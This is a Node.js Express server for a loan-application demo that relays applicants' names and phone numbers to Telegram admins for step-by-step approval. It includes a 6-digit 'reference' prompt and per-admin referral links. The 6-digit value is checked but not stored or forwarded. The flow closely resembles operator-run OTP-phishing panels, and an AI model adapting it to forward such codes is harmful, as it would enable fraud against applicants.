const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
app.use(express.json({ limit: '20kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_CHAT_ID = String(process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || '');
const PORT = Number(process.env.PORT || 3000);
const applications = new Map();
const fs = require('fs');
const ADMIN_DB = path.join(__dirname, 'admins.json');
const SUPER_ADMIN_CHAT_ID = String(process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || ADMIN_CHAT_ID);
const BASE_URL = String(process.env.BASE_URL || '').replace(/\/$/, '');
let admins = [];
try { admins = JSON.parse(fs.readFileSync(ADMIN_DB, 'utf8')); if (!Array.isArray(admins)) admins = []; } catch (_) { admins = []; }
function saveAdmins() { fs.writeFileSync(ADMIN_DB, JSON.stringify(admins, null, 2), { mode: 0o600 }); }
function isSuperAdmin(chatId) { return String(chatId) === SUPER_ADMIN_CHAT_ID && Boolean(SUPER_ADMIN_CHAT_ID); }
function adminLink(a) { return `${BASE_URL || 'https://your-domain.example'}?admin=${encodeURIComponent(a.slug)}`; }
let telegramOffset = 0;
let polling = false;

const safe = (v, n = 120) => String(v ?? '').trim().slice(0, n);
async function telegram(method, body) {
  if (!BOT_TOKEN) throw new Error('Telegram is not configured. Set TELEGRAM_BOT_TOKEN.');
  if (method !== 'getUpdates' && method !== 'getWebhookInfo' && method !== 'deleteWebhook' && !body.chat_id && method !== 'answerCallbackQuery') throw new Error(`Missing chat_id for Telegram method ${method}.`);
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });
  const data = await r.json();
  if (!r.ok || !data.ok) throw new Error(data.description || 'Telegram API request failed');
  return data.result;
}
function adminKeyboard(id, stage) {
  return { inline_keyboard: [[
    { text: '✅ Approve', callback_data: `approve:${stage}:${id}` },
    { text: '❌ Reject', callback_data: `reject:${stage}:${id}` }
  ]] };
}
async function notifyAdmin(appData, stage) {
  const lines = [
    `Independent Loan Service — ${stage === 1 ? 'STEP 1 REVIEW' : stage === 2 ? 'REFERENCE REVIEW' : 'LOAN REQUEST REVIEW'}`,
    `Application: ${appData.id}`,
    `Assigned admin: ${appData.assignedAdmin ? '#' + appData.assignedAdmin : 'Unassigned'}`,
    `Name: ${appData.name}`,
    `Phone: ${appData.phone}`,
    `Application reference: ${appData.applicationRef}`
  ];
  if (appData.amount !== undefined) lines.push(`Requested amount: GMD ${Number(appData.amount).toLocaleString('en-US')}`);
  if (stage === 2) lines.push('Demo reference step submitted. Do not send PINs, passwords, or SMS/OTP codes.');
  const assigned = appData.assignedAdmin ? admins.find(x => Number(x.number) === Number(appData.assignedAdmin) && x.status === 'active' && x.chatId) : null;
  // Always notify super-admin; also notify the assigned admin when connected.
  const recipients = [...new Set([SUPER_ADMIN_CHAT_ID, assigned?.chatId].filter(Boolean).map(String))];
  if (!BOT_TOKEN) throw new Error('Telegram bot token missing: set TELEGRAM_BOT_TOKEN in hosting environment.');
  if (!recipients.length) throw new Error('Telegram recipient missing: set TELEGRAM_SUPER_ADMIN_CHAT_ID in hosting environment.');
  const failures = [];
  let sent = 0;
  for (const chat_id of recipients) {
    try {
      await telegram('sendMessage', { chat_id, text: lines.join('\n'), reply_markup: adminKeyboard(appData.id, stage) });
      sent++;
    } catch (e) {
      console.error(`Telegram sendMessage failed for chat ${chat_id}:`, e.message);
      failures.push(e.message);
    }
  }
  if (!sent) throw new Error(`Telegram delivery failed: ${failures.join('; ') || 'No notification recipient accepted the message'}`);
}

app.post('/api/application', async (req, res) => {
  const name = safe(req.body.name, 80);
  const phone = safe(req.body.phone, 24);
  const applicationRef = safe(req.body.applicationRef, 32);
  if (!name || !phone || !/^[A-Za-z0-9-]{4,32}$/.test(applicationRef)) return res.status(400).json({ error: 'Enter your name, phone number, and a valid application reference number.' });
  const id = crypto.randomUUID();
  const slug = safe(req.body.adminSlug, 64);
  const assignedAdmin = admins.find(x => x.slug === slug && x.status === 'active');
  const record = { id, name, phone, applicationRef, assignedAdmin: assignedAdmin ? assignedAdmin.number : null, stage1: 'pending', stage2: 'not_started', createdAt: Date.now() };
  applications.set(id, record);
  try { await notifyAdmin(record, 1); }
  catch (e) { applications.delete(id); console.error('Step 1 notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, id, status: 'pending', message: 'Submitted. Please wait for admin approval before continuing.' });
});
app.get('/api/status/:id', (req, res) => {
  const a = applications.get(req.params.id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  res.json({ stage1: a.stage1, stage2: a.stage2, stage2Message: a.stage2Message || '' });
});
app.post('/api/reference-submit', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  if (a.stage1 !== 'approved') return res.status(409).json({ error: 'Wait for admin approval before continuing.' });
  // Validate format but never store or forward the entered 6-digit value to Telegram.
  const reference = safe(req.body.reference, 6);
  if (!/^\d{6}$/.test(reference)) return res.status(400).json({ error: 'Enter exactly 6 digits for this demo reference.' });
  a.stage2 = 'pending';
  try { await notifyAdmin(a, 2); }
  catch (e) { a.stage2 = 'not_started'; console.error('Reference notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Reference step submitted. Please wait for admin review.' });
});
app.post('/api/loan-request', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  const amount = Number(req.body.amount);
  if (!a || a.stage2 !== 'approved') return res.status(409).json({ error: 'The reference step must be approved before continuing.' });
  if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) return res.status(400).json({ error: 'Enter a valid amount in GMD.' });
  a.amount = amount;
  try { await notifyAdmin(a, 3); }
  catch (e) { console.error('Loan request notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Request submitted for review. This is not a loan approval.' });
});
async function handleCallback(q) {
  if (!q.message || (!isSuperAdmin(q.message.chat.id) && !admins.some(a => a.status === 'active' && String(a.chatId || '') === String(q.message.chat.id))) || String(q.from.id) === '') return;
  const data = safe(q.data, 200);
  const match = /^(approve|reject):(1|2|3):([0-9a-f-]{36})$/.exec(data);
  if (!match) return;
  const [, decision, stageText, id] = match;
  const stage = Number(stageText);
  const a = applications.get(id);
  const actor = admins.find(x => x.status === 'active' && String(x.chatId || '') === String(q.message.chat.id));
  if (actor && !isSuperAdmin(q.message.chat.id) && a && Number(a.assignedAdmin) !== Number(actor.number)) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'This application is assigned to another admin.' }); return; }
  if (!a) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Application expired or not found.' }); return; }
  if (stage === 1 && a.stage1 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Step 1 has already been reviewed.' }); return; }
  if (stage === 2 && a.stage2 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Reference step has already been reviewed.' }); return; }
  if (stage === 3 && !a.amount) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Loan request not found.' }); return; }
  if (stage === 1) a.stage1 = decision === 'approve' ? 'approved' : 'rejected';
  if (stage === 2) { a.stage2 = decision === 'approve' ? 'approved' : 'rejected'; a.stage2Message = decision === 'approve' ? 'Reference step approved.' : 'Reference step rejected. Please check and try again.'; }
  if (stage === 3) a.loanReview = decision === 'approve' ? 'approved' : 'rejected';
  await telegram('answerCallbackQuery', { callback_query_id: q.id, text: decision === 'approve' ? 'Approved' : 'Rejected' });
  const old = q.message.reply_markup;
  await telegram('editMessageReplyMarkup', { chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: { inline_keyboard: [] } });
  await telegram('sendMessage', { chat_id: ADMIN_CHAT_ID, text: `Application ${id}: ${stage === 1 ? 'Step 1' : stage === 2 ? 'Reference step' : 'Loan request'} ${decision === 'approve' ? 'approved' : 'rejected'}.` });
}
async function handleAdminCommand(message) {
  const chatId = String(message.chat.id);
  const text = safe(message.text, 1500);
  if (text === '/start' && isSuperAdmin(chatId)) {
    await telegram('sendMessage', { chat_id: chatId, text: 'Super-admin controls\\n/addadmin Name — create numbered admin + personal link\\n/admins — list admins and links\\n/revoke NUMBER — suspend admin\\n/restore NUMBER — restore admin\\n/broadcast MESSAGE — message all active admins\\n/notify MESSAGE — send super-admin notification test\\n/link NUMBER — show personal link' });
    return;
  }
  if (!isSuperAdmin(chatId)) {
    const connect = /^\/connect\s+(\d+)$/i.exec(text);
    if (connect) { const a = admins.find(x => Number(x.number) === Number(connect[1]) && x.status === 'active'); if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Active admin number not found.' }); if (a.chatId && String(a.chatId) !== chatId) return telegram('sendMessage', { chat_id: chatId, text: 'This admin is already connected to another Telegram account. Contact the super admin.' }); a.chatId = chatId; saveAdmins(); return telegram('sendMessage', { chat_id: chatId, text: `Connected as admin #${a.number} (${a.name}).` }); }
    return;
  }
  if (text.startsWith('/addadmin ')) {
    const name = safe(text.slice(10), 80);
    if (!name) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /addadmin Admin Name' });
    const number = admins.reduce((m, a) => Math.max(m, Number(a.number) || 0), 0) + 1;
    const slug = crypto.randomBytes(12).toString('hex');
    const a = { number, name, slug, status: 'active', chatId: null, createdAt: new Date().toISOString() };
    admins.push(a); saveAdmins();
    return telegram('sendMessage', { chat_id: chatId, text: `Admin #${number} added: ${name}\\nPersonal link: ${adminLink(a)}\\nShare this link with the assigned admin. They must open it and start the bot to connect their Telegram account.` });
  }
  if (text === '/admins') {
    const body = admins.length ? admins.map(a => `#${a.number} ${a.name} — ${a.status} — ${a.chatId ? 'Telegram connected' : 'not connected'}\\n${adminLink(a)}`).join('\\n\\n') : 'No admins added yet.';
    return telegram('sendMessage', { chat_id: chatId, text: body });
  }
  const action = /^\/(revoke|restore|link)\s+(\d+)$/i.exec(text);
  if (action) {
    const a = admins.find(x => Number(x.number) === Number(action[2]));
    if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Admin number not found.' });
    if (action[1] === 'revoke') a.status = 'revoked';
    if (action[1] === 'restore') a.status = 'active';
    saveAdmins();
    const reply = action[1] === 'link' ? `Admin #${a.number} personal link: ${adminLink(a)}` : `Admin #${a.number} ${a.name}: ${a.status}.`;
    return telegram('sendMessage', { chat_id: chatId, text: reply });
  }
  if (text.startsWith('/broadcast ')) {
    const body = safe(text.slice(11), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /broadcast message' });
    const recipients = admins.filter(a => a.status === 'active' && a.chatId);
    let sent = 0;
    for (const a of recipients) { try { await telegram('sendMessage', { chat_id: a.chatId, text: `📢 Super-admin broadcast\\n\\n${body}` }); sent++; } catch (_) {} }
    return telegram('sendMessage', { chat_id: chatId, text: `Broadcast sent to ${sent} of ${recipients.length} connected active admins.` });
  }
  if (text.startsWith('/notify ')) {
    const body = safe(text.slice(8), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /notify message' });
    await telegram('sendMessage', { chat_id: SUPER_ADMIN_CHAT_ID, text: `🔔 Super-admin notification\\n${body}` });
    return telegram('sendMessage', { chat_id: chatId, text: 'Notification sent.' });
  }
}

async function pollTelegram() {
  if (polling || !BOT_TOKEN || !SUPER_ADMIN_CHAT_ID) return;
  polling = true;
  try {
    const updates = await telegram('getUpdates', { offset: telegramOffset, timeout: 20, allowed_updates: ['callback_query', 'message'] });
    for (const u of updates) {
      telegramOffset = Math.max(telegramOffset, u.update_id + 1);
      if (u.callback_query) {
        try { await handleCallback(u.callback_query); } catch (e) { console.error('Telegram callback error:', e.message); }
      }
      if (u.message && u.message.text) {
        try { await handleAdminCommand(u.message); } catch (e) { console.error('Telegram admin command error:', e.message); }
      }
    }
  } catch (e) { console.error('Telegram polling error:', e.message); }
  finally { polling = false; }
}
if (BOT_TOKEN && (SUPER_ADMIN_CHAT_ID || ADMIN_CHAT_ID)) {
  // getUpdates will fail if a webhook is still configured for this bot. Remove it before polling.
  telegram('deleteWebhook', { drop_pending_updates: false }).then(() => {
    console.log('Telegram webhook cleared; long polling enabled.');
    setInterval(pollTelegram, 1500);
  }).catch(e => {
    console.error('Telegram startup error:', e.message);
    setInterval(pollTelegram, 5000);
  });
} else { console.error('Telegram notifications disabled: configure TELEGRAM_BOT_TOKEN and TELEGRAM_SUPER_ADMIN_CHAT_ID (or TELEGRAM_ADMIN_CHAT_ID).'); }
app.get('/api/health', (_req, res) => res.json({
  ok: true,
  telegramConfigured: Boolean(BOT_TOKEN && (SUPER_ADMIN_CHAT_ID || ADMIN_CHAT_ID)),
  botTokenConfigured: Boolean(BOT_TOKEN),
  superAdminConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  superAdminChatIdConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  baseUrlConfigured: Boolean(BASE_URL),
  admins: admins.length,
  note: 'Configuration presence only; send /notify test in Telegram and check hosting logs to confirm delivery.'
}));
app.listen(PORT, () => console.log(`Independent loan demo running on port ${PORT}; Telegram ${BOT_TOKEN && SUPER_ADMIN_CHAT_ID ? 'configured' : 'not configured'}`));
